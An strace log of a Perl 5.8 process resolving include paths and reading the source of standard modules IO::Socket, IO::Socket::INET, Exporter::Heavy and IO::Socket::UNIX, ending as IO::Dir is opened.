10104 20:03:03.560654 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
10104 20:03:03.637603 _llseek(6, 6698, [6698], SEEK_SET) = 0
10104 20:03:03.637663 _llseek(6, 0, [6698], SEEK_CUR) = 0
10104 20:03:03.637674 close(6)          = 0
10104 20:03:03.637699 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.637716 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.637730 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.637745 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.637760 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.637773 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.637788 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.637801 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.637815 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.637828 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.637843 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.637857 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
10104 20:03:03.637881 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:03.637897 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.637910 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:03.637940 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
10104 20:03:03.638319 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.638336 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.638350 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.638363 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.638378 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.638391 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.638406 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.638451 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.638476 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.638510 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.638528 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.638541 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.638556 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.638574 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
10104 20:03:03.638596 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.638612 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.638623 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.638642 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
10104 20:03:03.639370 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
10104 20:03:03.639640 brk(0x829c000)    = 0x829c000
10104 20:03:03.639946 read(8, "", 4096) = 0
10104 20:03:03.639978 close(8)          = 0
10104 20:03:03.641160 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
10104 20:03:04.008514 _llseek(6, 6496, [6496], SEEK_SET) = 0
10104 20:03:04.008536 _llseek(6, 0, [6496], SEEK_CUR) = 0
10104 20:03:04.008548 close(6)          = 0
10104 20:03:04.008634 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.008653 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.008668 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.008682 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.008697 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.008711 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.008725 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.008738 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.008752 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.008765 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.008826 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.008856 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
10104 20:03:04.008880 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:04.008897 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:04.008910 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:04.008927 brk(0x82bd000)    = 0x82bd000
10104 20:03:04.008944 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
10104 20:03:04.009767 _llseek(6, 1386, [1386], SEEK_SET) = 0
10104 20:03:04.009767 _llseek(6, 0, [1386], SEEK_CUR) = 0
10104 20:03:04.009767 close(6)          = 0
10104 20:03:04.009768 stat64("/etc/perl/IO/Dir.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.009768 stat64("/etc/perl/IO/Dir.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.009768 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.009773 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.009787 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.009800 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.009815 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.009827 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.009840 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.009852 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:04.009866 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:04.009879 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
10104 20:03:04.009932 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:04.009965 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
